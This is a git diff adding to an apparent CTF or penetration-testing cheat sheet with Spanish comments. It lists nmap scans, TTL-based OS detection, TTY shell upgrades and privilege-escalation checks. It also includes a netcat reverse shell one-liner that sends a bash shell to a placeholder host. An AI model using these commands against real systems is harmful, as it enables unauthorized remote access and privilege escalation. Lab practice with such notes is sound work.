@@ -1,18 +1,45 @@
+##OS Discovery##
+ping -c x.x.x.x
+Linux/unix TTL 64
+Wndows TTL 128
+Solaris/AIX 254
+
 ## NMAP ##
-nmap -p- --open -T5 -n -v X.X.X.X -oG nmap_full
+nmap -p- --open -T5 -n -v X.X.X.X -oN nmap_full
+nmap -p- -sS --min-rate 5000 -vvv -n --open -T5 -Pn X.X.X.X -oN nmap_full --> Mas rapido
 nmap -sC -sV -p21,22,80,443,8080 X.X.X.X -oN nmap_detailled
 nmap --script http-enum -p80 X.X.X.X -oN ScanWeb
 
-##UPGRADE SHELL##
+##REVERSE SHELL##
+nohup nc -e /bin/bash X.X.X.X 1234 & --> shell con proceso independiente
+
+##UPGRADE SHELL1##
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
 python /tmp/asdf.py
 
+##UPGRADE SHELL2##
+script /dev/null -c bash
+control+z
+stty raw -echo
+fg
+reset
+export term=XTERM
+export SHELL=bash
+stty -a --> correr localmente para ver proporciones de ventana
+stty rows 44 colums 187
+
 ##s4vitar##
+find \-name user.txt 2>/dev/null --> muestra ubicacion de archivo user.txt
 find \-type f 2>/dev/null  ##listar archivos con privilegios
 sudo -l  ##listar comandos sudos sin pass
 uid  ## ver privilegios
 find \-perm -4000 2>/dev/null  ##listar archivos con permisos suid
 
+##RECON PRIVESC##
+uname -a --> ver version de kernel
+id ## ver grupos
+sudo -l ## ver comandos que se pueden ejecutar como root sin pass
+find \-perm -4000 2>/dev/null  ##listar archivos con permisos suid
 
 
 ##Powershell download HTTP##
